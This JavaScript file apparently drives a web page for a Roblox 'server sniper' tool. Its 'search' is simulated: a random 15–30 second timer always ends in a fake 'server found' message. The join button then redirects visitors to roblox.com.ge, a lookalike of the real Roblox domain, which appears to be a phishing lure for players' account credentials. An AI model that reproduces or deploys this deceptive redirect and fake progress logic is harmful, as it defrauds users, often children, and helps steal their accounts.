// Tabs
const tabs = document.querySelectorAll('.nav-tab');
const contents = document.querySelectorAll('.tab-content');
tabs.forEach(tab=>{
    tab.addEventListener('click',()=>{
        tabs.forEach(t=>t.classList.remove('active'));
        tab.classList.add('active');
        const target = tab.dataset.tab;
        contents.forEach(c=>c.classList.remove('active'));
        document.getElementById(target).classList.add('active');
    });
});

// Server Snipe Logic
const startBtn = document.getElementById('start-btn');
const loader = document.getElementById('loader');
const serverFound = document.getElementById('server-found');
const joinBtn = document.getElementById('join-btn');
const notif = document.getElementById('notif');

let textDotCount = 0;
let textDotInterval;

function startTextDots(){
    textDotInterval = setInterval(()=>{
        textDotCount = (textDotCount % 3) + 1; // 1 → 2 → 3 → repeat
        startBtn.innerText = 'Searching server' + '.'.repeat(textDotCount);
    }, 500);
}

function stopTextDots(){
    clearInterval(textDotInterval);
    startBtn.innerText = 'Start Server Snipe';
}

startBtn.addEventListener('click', ()=>{
    startBtn.disabled = true;
    serverFound.classList.add('hidden');
    loader.classList.remove('hidden');

    startTextDots();

    const searchTime = Math.random() * (30000 - 15000) + 15000; // 15-30s
    setTimeout(()=>{
        loader.classList.add('hidden');
        serverFound.classList.remove('hidden');
        notif.classList.add('show');
        startBtn.disabled = false;

        stopTextDots();

        setTimeout(()=>{notif.classList.remove('show');},3000);
    }, searchTime);
});

joinBtn.addEventListener('click', ()=>{
    window.location.href = 'https://roblox.com.ge/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=59065467915052125152369995226825';
});
